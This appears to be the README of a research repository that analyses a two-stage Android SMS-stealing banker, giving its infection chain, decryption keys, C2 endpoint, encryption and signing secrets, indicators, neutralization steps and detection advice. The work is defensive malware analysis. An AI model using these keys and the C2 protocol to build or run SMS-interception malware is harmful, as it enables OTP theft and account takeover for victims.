# EVANGELION / Wonderland — Two-Stage Android SMS Banker

A complete static analysis of a two-stage Android malware chain distributed under a fake Google Play / file-update presentation. The first stage decrypts and installs an embedded APK; the second stage intercepts SMS and notification content, collects device and SIM telemetry, and exfiltrates it to an authenticated, AES-GCM-encrypted command-and-control channel.

**The APKs in this repository are modified, non-operational research samples. They are not the original live malware.** Payload delivery, application components, sensitive permissions, and C2 dispatch were disabled before publication. Both APKs display `NEUTRALIZED RESEARCH SAMPLE` and are signed with a certificate whose subject is `CN=RESEARCH-MODIFIED-SAMPLE`.

Analysis date: **2026-11-17**

Family identifiers: **EVANGELION**, **Wonderland / WretchedCat**

Attribution confidence: **cluster-level only**

## Key findings

- Stage 1 (`it.sharp.hidden`) stores the second stage as the encrypted asset `assets/ylx0` and installs it through Android `PackageInstaller` sessions.
- The asset is transformed with cyclic XOR followed by AES-128-ECB, both using `TIwcHVIsbeO13zlm`.
- The recovered stage 2 is `p_toydan8102.apk`, package `ai.your.tundra`, version `4.76.57` (`81029621`).
- Stage 2 combines priority-999 SMS interception, notification-listener access, SMS sending, phone/SIM collection, USSD execution, boot persistence, and scheduled keepalive jobs.
- The observed C2 endpoint is `POST https://orehi.top/`. Commands are encrypted path tokens rather than URL paths.
- C2 payloads use AES-256-GCM with a fixed 12-byte IV, plus an `X-Timestamp` / `X-Signature` request-authentication scheme.
- The payload contains Telegram recipient chat ID `8731793636`; the sample does not contain the bot token or evidence that identifies the person controlling that chat.
- Public reporting overlaps with EVANGELION and Wonderland/WretchedCat, associated by Group-IB with the TrickyWonders cluster. No individual attribution is made here.

## Repository contents

| Path | Description |
|---|---|
| [`scammers_apk_file.apk`](scammers_apk_file.apk) | **Modified research build** of the stage-1 dropper; encrypted payload removed and application disabled |
| [`p_toydan8102.apk`](p_toydan8102.apk) | **Modified research build** of the original stage-2 payload; C2 and malicious components disabled |
| [`analysis/REPORT.md`](analysis/REPORT.md) | Full infection-chain, unpacking, capability, C2, exfiltration, attribution, neutralization, and verification report |
| [`IOCs.md`](IOCs.md) | Original-sample and infrastructure indicators, separated from modified-artifact hashes |
| [`tools/decoders.py`](tools/decoders.py) | Python implementations of the payload's six per-class Base64/XOR string decoders |
| [`tools/unpack_stage2.py`](tools/unpack_stage2.py) | Offline stage-2 recovery tool for a previously preserved `ylx0` asset |
| [`requirements.txt`](requirements.txt) | Python dependency for offline payload recovery |

Install the tool dependency with `python -m pip install -r requirements.txt`.

## Published research artifacts

| Artifact | Size | SHA-256 |
|---|---:|---|
| `scammers_apk_file.apk` — modified | 750,283 bytes | `224ad223b2ea6fa56b02ae82411cb5b20f57eb1a5a2f22165f6f4e0b0bcc900a` |
| `p_toydan8102.apk` — modified | 424,459 bytes | `5b5880673fa66b9265049d844c057f860f5177c15aef293ab19c86799a060749` |

### Original samples — not distributed here

| Artifact | Size | SHA-256 |
|---|---:|---|
| Original dropper, renamed for analysis to `scammers_apk_file.apk` | 1,323,012 bytes | `8298a151bde2a84255d32f495f7c2baa85e60b466dbd33f22951e7e59de5c753` |
| Original decrypted `p_toydan8102.apk` | 371,330 bytes | `55d6ac453a19ce6bedd30b16173e18dc74cc0f7a4b5f2579a8cc8b2105df22ba` |

The original hashes are retained for identification and detection. They do **not** match the downloadable research builds.

## Infection chain

```text
Social-engineered APK installation
                |
                v
it.sharp.hidden — stage 1
  |-- fake update / file presentation
  |-- assets/ylx0: cyclic XOR + AES-128-ECB
  |-- recovers p_toydan8102.apk
  |-- PackageInstaller session requests installation
  `-- VPN and supporting components present in the original
                |
                v
ai.your.tundra — stage 2
  |-- SMS_RECEIVED receiver, priority 999
  |-- NotificationListenerService
  |-- boot receiver + JobScheduler persistence
  |-- SMS, SIM, device, application and battery collection
  `-- encrypted POST https://orehi.top/
                |
                v
Operator infrastructure / Telegram chat ID 8731793636
```

## Neutralization summary

| Stage | Changes applied to the published build |
|---|---|
| Stage 1 | Removed `assets/ylx0`; disabled the entire application; removed `INTERNET` and `REQUEST_INSTALL_PACKAGES`; replaced both application labels; rebuilt and research-signed |
| Stage 2 | Replaced both common C2 dispatch methods with immediate `null` returns; disabled the entire application; removed SMS, phone, package-inventory, Internet, and boot permissions; removed SMS/boot/notification components; disabled foreground and job services; replaced labels; rebuilt and research-signed |

Final rebuilt APKs were decoded again and checked statically. Archive/signature verification succeeded. **No emulator or physical-device execution was performed**, so the verification record distinguishes static non-operability from untested runtime behavior. See the [verification section](analysis/REPORT.md#11-neutralization-and-verification) for exact checks and limitations.

## C2 at a glance

```text
POST https://orehi.top/
Content-Type: application/json
X-Timestamp: <Unix time>
X-Signature: <lowercase SHA-256 hex>

{"result":"<Base64 AES-256-GCM ciphertext>"}
```

```text
key       = SHA-256("2fCpMDVTAE3ZbHHvqJM9T1xIpgJGKedY")
IV        = SHA-256("OTpkz8YYPT3Crz9m")[0:12]
GCM tag   = 128 bits
signature = SHA256_HEX(body + "|" + timestamp + "|DdQ3sfVT0RgviD358cpE0k")
```

The domain list is persisted in `eva_requests` under `main_domain`; the response field `rV` can replace it. Six recovered path tokens cover registration, SMS batches, USSD results, polling/battery state, device-state pushes, and phone/SIM inventory. Full schemas are in the [technical report](analysis/REPORT.md#6-command-and-control-protocol).

## Detection and response

Prioritize original-sample hashes, package names, the C2 request shape, preference files, and job IDs listed in [`IOCs.md`](IOCs.md). On a suspected victim device, preserve SMS and notification access grants, installed-package evidence, app-op states, VPN configuration, and relevant network logs before remediation. Revoke notification/SMS access, remove both packages, rotate exposed credentials, and review accounts for OTP-driven compromise.

## Attribution boundary

The numeric Telegram chat ID is an infrastructure indicator, not an identity. Public attribution remains at the malware-family / actor-cluster level. The sample alone cannot establish a real name, location, or current operator.

## References

- Group-IB, *Choose Your Fighter: A New Stage in the Evolution of Android SMS Stealers in Uzbekistan*, December 2025.
- Starlabs ACT, Android C2 Tracker, family entry *EVANGELION (provisional)*.

## License

Analysis text and original tooling are MIT-licensed; see [`LICENSE`](LICENSE). The modified APKs remain malware-derived research artifacts and are provided as-is for defensive analysis, education, and detection engineering.
